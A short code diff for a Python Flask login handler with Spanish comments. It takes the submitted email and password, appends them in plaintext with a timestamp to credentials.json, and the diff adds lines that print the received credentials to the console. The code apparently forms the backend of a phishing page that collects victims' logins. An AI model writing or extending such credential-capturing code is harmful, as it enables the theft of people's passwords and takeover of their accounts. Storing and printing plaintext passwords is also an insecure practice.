@@ -12,6 +12,11 @@ def index():
 def login():
     email = request.form.get('email')
     password = request.form.get('pass')
+
+    print("---------- Credenciales recibidas ----------")
+    print(f"Email: {email}")
+    print(f"Password: {password}")
+    print("------------------------------------------")
     
     # Crear un diccionario con los datos
     data = {
@@ -20,7 +25,7 @@ def login():
         'fecha': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
     }
     
-    # Guardar en archivo JSON
+    # Guardar en archivo JSON 
     try:
         with open('credentials.json', 'a') as f:
             json.dump(data, f)
